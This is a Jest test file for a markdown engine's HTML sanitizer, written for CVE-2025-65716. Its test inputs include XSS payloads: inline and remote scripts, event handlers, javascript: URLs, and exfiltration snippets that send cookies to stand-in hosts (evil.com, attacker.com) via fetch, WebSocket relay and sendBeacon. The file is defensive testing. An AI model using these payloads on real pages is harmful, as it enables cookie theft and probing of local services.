import * as cheerio from 'cheerio';
import { sanitizeRenderedHTML } from '../src/markdown-engine/sanitize';

describe('sanitizeRenderedHTML (CVE-2025-65716)', () => {
  function sanitize(html: string): string {
    const $ = cheerio.load(html);
    sanitizeRenderedHTML($);
    return ($('body').html() ?? '').trim();
  }

  describe('script tag removal', () => {
    it('removes inline script tags', () => {
      const result = sanitize('<p>Hello</p><script>alert("xss")</script>');
      expect(result).toBe('<p>Hello</p>');
      expect(result).not.toContain('<script');
    });

    it('removes script tags with src', () => {
      const result = sanitize(
        '<div><script src="http://evil.com/payload.js"></script></div>',
      );
      expect(result).not.toContain('<script');
    });

    it('removes script tags inside SVG', () => {
      const result = sanitize('<svg><script>alert("xss")</script></svg>');
      expect(result).not.toContain('<script');
    });
  });

  describe('event handler attribute removal', () => {
    it('strips onload from iframe', () => {
      const result = sanitize(
        '<iframe src="http://example.com" onload="alert(1)"></iframe>',
      );
      expect(result).not.toContain('onload');
      expect(result).toContain('iframe');
    });

    it('strips onerror from img', () => {
      const result = sanitize('<img src="x" onerror="alert(1)">');
      expect(result).not.toContain('onerror');
      expect(result).toContain('<img');
    });

    it('strips onclick from any element', () => {
      const result = sanitize('<div onclick="stealData()">Click me</div>');
      expect(result).not.toContain('onclick');
      expect(result).toContain('Click me');
    });

    it('strips onmouseover', () => {
      const result = sanitize('<a href="#" onmouseover="evil()">Link</a>');
      expect(result).not.toContain('onmouseover');
    });

    it('strips onfocus', () => {
      const result = sanitize('<input onfocus="evil()" autofocus>');
      expect(result).not.toContain('onfocus');
    });

    it('strips SVG onload', () => {
      const result = sanitize(
        '<svg onload="alert(1)"><circle r="10"></circle></svg>',
      );
      expect(result).not.toContain('onload');
    });
  });

  describe('dangerous URL scheme removal', () => {
    it('strips javascript: from href', () => {
      const result = sanitize('<a href="javascript:alert(1)">Click</a>');
      expect(result).not.toContain('javascript:');
      expect(result).toContain('Click');
    });

    it('strips javascript: from src', () => {
      const result = sanitize('<iframe src="javascript:alert(1)"></iframe>');
      expect(result).not.toContain('javascript:');
    });

    it('strips vbscript: URLs', () => {
      const result = sanitize('<a href="vbscript:MsgBox(1)">Click</a>');
      expect(result).not.toContain('vbscript:');
    });

    it('strips data:text/html URLs', () => {
      const result = sanitize(
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
      );
      expect(result).not.toContain('data:text/html');
    });

    it('handles case-insensitive javascript: URLs', () => {
      const result = sanitize('<a href="JaVaScRiPt:alert(1)">Click</a>');
      expect(result).not.toContain('href');
    });

    it('handles whitespace-padded javascript: URLs', () => {
      const result = sanitize('<a href="  javascript:alert(1)">Click</a>');
      expect(result).not.toContain('javascript');
    });

    it('preserves safe URLs', () => {
      const result = sanitize('<a href="https://example.com">Safe link</a>');
      expect(result).toContain('href="https://example.com"');
    });

    it('preserves data: image URLs', () => {
      const result = sanitize('<img src="data:image/png;base64,abc123">');
      expect(result).toContain('data:image/png');
    });
  });

  describe('dangerous tag removal', () => {
    it('removes object tags', () => {
      const result = sanitize(
        '<object data="http://evil.com/flash.swf"></object>',
      );
      expect(result).not.toContain('<object');
    });

    it('removes embed tags', () => {
      const result = sanitize('<embed src="http://evil.com/flash.swf">');
      expect(result).not.toContain('<embed');
    });

    it('removes applet tags', () => {
      const result = sanitize('<applet code="Evil.class"></applet>');
      expect(result).not.toContain('<applet');
    });

    it('preserves WaveDrom data scripts', () => {
      const result = sanitize(
        '<div class="wavedrom"><script type="WaveDrom">{"signal":[]}</script></div>',
      );
      expect(result).toContain('<script type="WaveDrom">');
      expect(result).toContain('{"signal":[]}');
    });

    it('removes script tags without type', () => {
      const result = sanitize('<script>alert("xss")</script>');
      expect(result).not.toContain('<script');
    });

    it('removes script tags with type="text/javascript"', () => {
      const result = sanitize(
        '<script type="text/javascript">alert("xss")</script>',
      );
      expect(result).not.toContain('<script');
    });
  });

  describe('iframe sandboxing', () => {
    it('adds sandbox attribute to iframes', () => {
      const result = sanitize('<iframe src="https://example.com"></iframe>');
      expect(result).toContain('sandbox=""');
    });

    it('overrides existing sandbox attribute', () => {
      const result = sanitize(
        '<iframe src="https://example.com" sandbox="allow-scripts allow-same-origin"></iframe>',
      );
      expect(result).toContain('sandbox=""');
      expect(result).not.toContain('allow-scripts');
    });

    it('removes srcdoc from iframes', () => {
      const result = sanitize(
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      );
      expect(result).not.toContain('srcdoc');
    });
  });

  describe('preserves safe HTML', () => {
    it('preserves standard markdown elements', () => {
      const html = `
        <h1>Title</h1>
        <p>Paragraph with <strong>bold</strong> and <em>italic</em>.</p>
        <ul><li>Item 1</li><li>Item 2</li></ul>
        <table><tr><th>Header</th></tr><tr><td>Cell</td></tr></table>
        <pre><code class="language-js">const x = 1;</code></pre>
        <blockquote>Quote</blockquote>
      `;
      const result = sanitize(html);
      expect(result).toContain('<h1>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('<ul>');
      expect(result).toContain('<table>');
      expect(result).toContain('<pre>');
      expect(result).toContain('<blockquote>');
    });

    it('preserves data attributes used by crossnote', () => {
      const result = sanitize('<p data-source-line="5">Content</p>');
      expect(result).toContain('data-source-line="5"');
    });

    it('preserves class attributes', () => {
      const result = sanitize('<div class="mermaid">graph TD; A-->B;</div>');
      expect(result).toContain('class="mermaid"');
    });

    it('preserves images with safe src', () => {
      const result = sanitize(
        '<img src="https://example.com/image.png" alt="test">',
      );
      expect(result).toContain('src="https://example.com/image.png"');
    });
  });

  describe('CVE-2025-65716 specific attack vectors', () => {
    it('neutralizes iframe+onload attack', () => {
      const result = sanitize(
        '<iframe src="http://localhost:8080" onload="fetch(\'http://evil.com/steal?data=\'+document.cookie)"></iframe>',
      );
      expect(result).not.toContain('onload');
      expect(result).toContain('sandbox=""');
    });

    it('neutralizes port scanning via iframe', () => {
      const result = sanitize(
        '<iframe src="http://localhost:3000" onload="scanPorts()"></iframe>',
      );
      expect(result).not.toContain('onload');
      expect(result).toContain('sandbox=""');
    });

    it('handles complex attack payload', () => {
      const malicious = `
        <p>Innocent looking document</p>
        <iframe src="http://localhost:9222" onload="
          var ws = new WebSocket('ws://localhost:9222');
          ws.onmessage = function(e) {
            fetch('http://attacker.com/exfil', {method:'POST', body: e.data});
          };
        "></iframe>
        <script>
          navigator.sendBeacon('http://attacker.com/ping', JSON.stringify({
            hostname: location.hostname,
            cookies: document.cookie
          }));
        </script>
      `;
      const result = sanitize(malicious);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('onload');
      expect(result).not.toContain('WebSocket');
      expect(result).not.toContain('sendBeacon');
      expect(result).toContain('Innocent looking document');
      expect(result).toContain('sandbox=""');
    });
  });
});
